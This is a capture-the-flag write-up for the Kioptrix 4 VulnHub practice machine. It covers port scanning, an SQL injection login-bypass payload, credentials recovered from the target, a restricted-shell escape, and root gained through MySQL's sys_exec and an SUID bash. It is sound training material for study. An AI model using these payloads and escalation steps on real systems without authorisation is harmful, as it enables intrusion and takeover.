---
title: "Kioptrix 4"
date: 2024-05-15
draft: false
summary: "Writeup for Kioptrix level 4 of the Kioptrix series challenge on VulnHub."
tags: ["kioptrix", "linux", "sql injection", "suid"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/kioptrix4/cover.png"
  caption: "Kioptrix 4 VulnHub Challenge"
  alt: "Kioptrix 4 cover"
platform: "VulnHub"
---

*Kioptrix 4* is yet another challenge in the **kioptrix** series and is meant for beginners. The goal of this challenge is to obtain the flag from the root directory.
<!--more-->
You can download *kioptrix 4* by clicking on the link given below:
- https://www.vulnhub.com/entry/kioptrix-level-13-4,25/

## Recon

I performed a network scan to identify the target IP.

```bash
nmap -sn 192.168.1.0/24                              
```

After finding the target IP, I performed an **nmap** aggressive scan to discover the ports that were open and the services running on them.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN nmap.out
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 80       | http        |
| 139      | netbios     |
| 445      | smb         |

![](https://cdn.ziomsec.com/kioptrix4/1.png)

## Initial Foothold

### Gaining Shell

I accessed the http service through my web browser and landed on a login panel.

![](https://cdn.ziomsec.com/kioptrix4/2.png)

I then also used **ffuf** to fuzz the web directories for more information.

```shell
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,301
```

![](https://cdn.ziomsec.com/kioptrix4/3.png)

Fuzzing files revealed an interesting file called *database.sql* - so I accessed it using **curl**.

```shell
curl http://TARGET/database.sql
```

![](https://cdn.ziomsec.com/kioptrix4/4.png)

The file revealed table name, username and a potential password. However, when I tried these credentials on the login page, it did not work.

![](https://cdn.ziomsec.com/kioptrix4/5.png)

Since our input was making the application interact with the database, I tried **sql injection**. Adding a **`'`** in the password field and got a database error - confirming the vulnerability.

![](https://cdn.ziomsec.com/kioptrix4/6.png)

Hence, I added a true statement and logged in as **john**.

```
1234'or''=''#
```

![](https://cdn.ziomsec.com/kioptrix4/7.png)

Upon logging in, I got the user credentials.

The **nmap** scan also revealed an SMB service running, so I use **enum4linux** to gather information about it.

```bash
enum4linux TARGET
```

![](https://cdn.ziomsec.com/kioptrix4/8.png)

**enum4linux** revealed some more users. I logged in as them and got their password's aswell.

| user   | password              |
| ------ | --------------------- |
| john   | MyNameIsJohn          |
| robert | ADGAdsafdfwt4gadfga== |

I then used **ssh** to log in as the user *john*.

```shell
ssh john@TARGET
```

![](https://cdn.ziomsec.com/kioptrix4/9.png)

### Escaping R-Bash

The shell that I got was restricted and allowed only certain commands. I googled ways to escape **rbash** using the allowed commands.

I used the below command to break out of the **rbash**

```bash
echo os.system('/bin/bash')
```

![](https://cdn.ziomsec.com/kioptrix4/10.png)

## Privilege Escalation

### Enumerating Vectors

I downloaded the **linux smart enumeration** script on the target machine to perform privesc enumeration.
- https://github.com/diego-treitos/linux-smart-enumeration

![](https://cdn.ziomsec.com/kioptrix4/11.png)

This revealed that I could connect to the MySQL server as root without any password. Therefore, I looked for services running as root and found **MySQL**.

![](https://cdn.ziomsec.com/kioptrix4/12.png)

> I used `grep -v "]"` to exclude internal system services when searching for services running as root, simplifying the results. This confirmed that MySQL was not running with a service user as it normally should but as root. 

So I loged into the database:

```shell
mysql -u root -p
# hit Enter
```

![](https://cdn.ziomsec.com/kioptrix4/13.png)

I looked into the *members* database and found the credentials of Robert and John.

```mysql
use members;
show tables;
select * from members;
```

![](https://cdn.ziomsec.com/kioptrix4/14.png)

Since I was executing commands as root, I could use built-in functions like **`load_file`** to read system files.

```mysql
select load_file('/etc/passwd');
```

![](https://cdn.ziomsec.com/kioptrix4/15.png)

### Exploiting User-Defined SQL Functions

Inside the *mysql* database, I found a table with functions that could be interesting.

```mysql
select * from func;
```

![](https://cdn.ziomsec.com/kioptrix4/16.png)

The **sys_exec** function seemed interesting, so I tried using it to create a new file in the *root* directory.

```mysql
select sys_exec('touch /root/test.txt');
```

![](https://cdn.ziomsec.com/kioptrix4/17.png)

After executing the command, I verified it by visiting the root directory and found our test file.

![](https://cdn.ziomsec.com/kioptrix4/18.png)

Since I could execute commands as *root*, I added an **SUID** bit to the **bash** shell so that I could run it in privileged mode to escalate my privileges.

```mysql
select sys_exec('chmod u+s /bin/bash');
```

![](https://cdn.ziomsec.com/kioptrix4/19.png)

Verifying the bash shell confirmed that an **SUID** bit was added to it.

```shell
ls -la /bin/bash

# execute bash in privileged mode
bash -p
```

![](https://cdn.ziomsec.com/kioptrix4/20.png)

With root access, I was able to capture the flag located in the */root* directory.

```shell
cd /root/
cat congrats.txt
```

![](https://cdn.ziomsec.com/kioptrix4/21.png)

## Closure

I gained access to Kioptrix 4 by following these steps:
- First, I explored the web page and discovered a file named *database.sql*.
- Inside this file, I found a user called **john**.
- Using **enum4linux**, I uncovered another user - **robert**.
- By exploiting a SQL injection vulnerability in the password field on the login page, I bypassed authentication and obtained passwords for both users.
- Although I initially accessed the target via **ssh** using these credentials, I ended up in a restricted shell.
- I escaped this restricted shell and ran a script called **lse**.
- Through this script, I discovered that the MySQL service was accessible with the **root** user and a blank password.
- Upon logging into the SQL server, I found a user-defined function that allowed me to execute system commands.
- Because the MySQL service was running as **root**, I had the privilege to execute any command.
- To further elevate privileges, I added a special permission (SUID bit) to the **bash** shell.
- Subsequently, I reconnected, escaped the restricted shell, and executed `bash -p` to gain root access.

That's it from my side, Happy Hacking :)

---
